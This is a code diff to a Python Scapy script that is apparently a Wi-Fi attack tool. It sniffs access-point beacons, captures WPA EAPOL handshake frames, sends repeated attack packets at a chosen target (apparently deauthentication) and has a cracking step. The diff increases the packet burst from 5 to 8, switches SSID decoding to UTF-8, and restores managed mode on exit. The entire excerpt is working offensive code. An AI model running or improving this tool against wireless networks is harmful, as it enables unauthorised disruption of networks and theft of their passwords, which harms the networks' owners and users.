@@ -68,17 +68,15 @@ def sniffCallback(packet):
         pass
 
     try:
-        SSIDLen = packet[Dot11Elt].len
         SSID = packet[Dot11Elt].info
     except:
-        SSIDLen = 0
         SSID = None
 
     if SSID != None and packet.type == 0 and packet.subtype == 8:
         global SSIDList
 
         if BSSID in SSIDList.keys(): return
-        SSIDList[BSSID] = APInfo(BSSID, SSID.decode('ascii'), int(ord(packet[Dot11Elt:3].info)))
+        SSIDList[BSSID] = APInfo(BSSID, SSID.decode('utf-8'), int(ord(packet[Dot11Elt:3].info)))
 
     if packet.haslayer(EAPOL) and BSSID in SSIDList.keys() and (DestMAC == BSSID or SrcMAC == BSSID):
         SSIDList[BSSID].storeHandshakeFrame(packet)
@@ -114,7 +112,7 @@ def doAttack():
     forceChannel = SSIDList[targetMac].channel
     while currentChannel != forceChannel: pass
     # sleep(10)
-    sendp(packet, inter=1, count=5, iface=interface, verbose=1)
+    sendp(packet, inter=1, count=8, iface=interface, verbose=1)
     forceChannel = -1
 
 def doCrack():
@@ -207,8 +205,6 @@ def main():
     system(f"ifconfig {interface} down")
     system(f"iwconfig {interface} mode monitor")
     system(f"ifconfig {interface} up")
-    # system("airmon-ng check kill")
-    # system(f"airmon-ng start {interface}")
     print("Interface turned into monitor mode!")
 
     Thread(target=channelThread, daemon=True).start()
@@ -221,6 +217,10 @@ def main():
 
         if result[0] == attack: doAttack()
         elif result[0] == crack: doCrack()
-        else: quit()
+        else:
+            system(f"ifconfig {interface} down")
+            system(f"iwconfig {interface} mode managed")
+            system(f"ifconfig {interface} up")
+            quit()
 
 if __name__ == "__main__": main()
